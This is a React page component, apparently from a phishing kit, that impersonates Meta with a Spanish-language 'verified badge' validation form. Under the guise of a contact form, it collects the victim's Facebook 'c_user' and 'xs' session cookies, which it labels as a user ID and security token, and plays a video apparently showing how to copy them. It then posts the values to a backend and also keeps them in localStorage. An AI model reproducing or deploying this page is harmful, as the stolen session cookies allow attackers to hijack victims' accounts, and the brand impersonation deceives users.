import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { validationFormSchema } from "@shared/schema";
import { apiRequest } from "@/lib/queryClient";
import { useMobile } from "@/hooks/use-mobile";
import { MobileModal } from "@/components/mobile-modal";
import { useState, useEffect } from "react";

export default function Validation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const isMobile = useMobile();
  const [showMobileModal, setShowMobileModal] = useState(false);

  useEffect(() => {
    if (isMobile) {
      setShowMobileModal(true);
    }
  }, [isMobile]);

  const form = useForm({
    resolver: zodResolver(validationFormSchema),
    defaultValues: {
      c_user: "",
      xs: "",
    },
  });

  const onSubmit = async (data: any) => {
    try {
      await apiRequest('POST', '/api/contact-form', data);
      localStorage.setItem('validation_data', JSON.stringify(data));

      toast({
        title: "Éxito",
        description: "Por favor, continúe con el siguiente paso",
      });
      setLocation("/confirmation");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Error al enviar el formulario. Por favor, inténtelo de nuevo.",
      });
    }
  };

  return (
    <>
      <MetaTags 
        title="Formulario de Contacto | Validación Inicial"
        description="Por favor, complete el formulario de validación inicial"
      />
      <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />

      <div className="min-h-screen flex">
        {/* Sidebar for desktop */}
        {!isMobile && (
          <div className="w-64 bg-white border-r border-gray-200 hidden lg:block">
            <div className="p-4">
              <h1 className="text-xl font-bold text-gray-900">Formulario de Contacto</h1>
              <div className="mt-8 space-y-4">
                <p className="text-gray-700 font-semibold">Progreso</p>
                <div className="space-y-2">
                  <div className="flex items-center space-x-2 text-blue-600">
                    <div className="w-2 h-2 bg-blue-600 rounded-full" />
                    <p className="text-sm">Validación Inicial</p>
                  </div>
                  <div className="flex items-center space-x-2 text-gray-400">
                    <div className="w-2 h-2 bg-gray-400 rounded-full" />
                    <p className="text-sm">Confirmación</p>
                  </div>
                  <div className="flex items-center space-x-2 text-gray-400">
                    <div className="w-2 h-2 bg-gray-400 rounded-full" />
                    <p className="text-sm">Éxito</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Main content */}
        <div className="flex-1 flex flex-col bg-white">
          <div className="flex-1 flex justify-center p-4 sm:p-8">
            <div className="max-w-2xl w-full space-y-4 sm:space-y-6">
              <h1 className="text-xl sm:text-2xl font-bold text-gray-900">
                Formulario de Contacto - Validación Inicial
              </h1>

              <div className="space-y-3 sm:space-y-4 text-gray-600 text-sm sm:text-base">
                <p>
                  La insignia verificada significa que Facebook ha confirmado que la Página o el perfil es la presencia auténtica del individuo, figura pública o marca que representa.
                </p>
                <p>
                  Anteriormente, la insignia verificada también requería que la persona o marca fuera notable y única. Es posible que aún vea usuarios con una insignia verificada que representa nuestros requisitos de elegibilidad anteriores.
                </p>
                <p>
                  Proporcione los detalles precisos a continuación. Consulte el video para obtener aclaraciones si las instrucciones no están claras.
                </p>
              </div>

              <div className="bg-[#F0F2F5] p-4 sm:p-6 rounded-lg space-y-4">
                <h2 className="text-base sm:text-lg font-semibold text-[#1c1e21]">Información Detallada en Video</h2>

                <div className="video-container relative w-full aspect-video rounded-lg overflow-hidden bg-black">
                  <video
                    className="w-full h-full"
                    controls
                    playsInline
                    preload="auto"
                  >
                    <source
                      src="https://pub-97836f8a77c541e9afe2515c4730dd50.r2.dev/cookie.mp4"
                      type="video/mp4"
                    />
                    Su navegador no admite la etiqueta de video.
                  </video>
                </div>

                <h3 className="font-semibold text-sm sm:text-base text-[#1c1e21]">
                  Debe ver el video y enviar la información requerida correctamente.
                </h3>
              </div>

              <Form {...form}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                  <FormField
                    control={form.control}
                    name="c_user"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-sm sm:text-base text-gray-700">ID de Usuario</FormLabel>
                        <FormControl>
                          <Input
                            type="number"
                            min="0"
                            pattern="[0-9]+"
                            minLength={6}
                            placeholder="Ingrese su ID de usuario"
                            className="text-sm sm:text-base border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                            {...field}
                          />
                        </FormControl>
                        <FormMessage className="text-xs text-red-500" />
                      </FormItem>
                    )}
                  />
                  <FormField
                    control={form.control}
                    name="xs"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-sm sm:text-base text-gray-700">Token de Seguridad</FormLabel>
                        <FormControl>
                          <Input 
                            type="text" 
                            placeholder="Ingrese su token de seguridad" 
                            className="text-sm sm:text-base border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                            {...field} 
                          />
                        </FormControl>
                        <FormMessage className="text-xs text-red-500" />
                      </FormItem>
                    )}
                  />

                  <p className="text-xs sm:text-sm text-gray-500">
                    Por favor, asegúrese de que toda la información sea correcta antes de enviar.
                  </p>

                  <Button 
                    type="submit" 
                    className="w-full py-2 sm:py-2.5 text-sm sm:text-base bg-blue-600 hover:bg-blue-700 transition-colors duration-200"
                    disabled={form.formState.isSubmitting}
                  >
                    {form.formState.isSubmitting ? "Enviando..." : "Continuar"}
                  </Button>
                </form>
              </Form>
            </div>
          </div>

          <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-gray-500 border-t">
            Meta © 2025
          </div>
        </div>
      </div>
    </>
  );
}